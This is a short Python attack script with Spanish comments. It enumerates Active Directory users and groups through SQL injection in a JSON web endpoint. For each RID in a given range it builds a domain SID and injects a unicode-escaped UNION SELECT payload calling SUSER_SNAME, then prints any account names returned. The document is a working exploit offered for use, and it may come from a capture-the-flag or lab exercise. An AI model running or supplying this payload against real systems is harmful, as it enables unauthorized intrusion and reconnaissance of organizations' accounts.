import json
import requests
from time import sleep
from colorama import init, Fore

url = input("Endpoint: ")
domain_sid = input("SID Dominio: ")
start_range = int(input("Valor inicial del rango RID: "))
end_range = int(input("Valor final del rango RID: "))
headers={'Content-Type': 'Application/json'}

# Codificar payload
def encode_me(payload):
    return ''.join(f"\\u00{ord(c):x}" for c in payload)

print(f"{Fore.YELLOW}[+]Procesando usuarios/grupos validos en el dominio{Fore.RESET}")

# Iterate RID
for i in range(start_range, end_range):
    hex_value = format(i, '04X') 
    reversed_bytes = bytearray.fromhex(hex_value)
    reversed_bytes.reverse()
    result = ''.join(format(x, '02x') for x in reversed_bytes).upper() + '0' * 4

    #request
    sid = '{}{}'.format(domain_sid, result)
    payload = "x' UNION SELECT 1,SUSER_SNAME({}),3,4,5--".format(sid)
    data='{"name":"'+ encode_me(payload) + '"}'
      
    responde = requests.post(url,data=data,headers=headers)

    user = json.loads(responde.text)[0]["name"]

    if user:
        print(user)
    sleep(1)

 # Detener el proceso al llegar al rango final
    if i == end_range - 1:
        print(f"{Fore.YELLOW}[+]Proceso finalizado{Fore.RESET}")
        break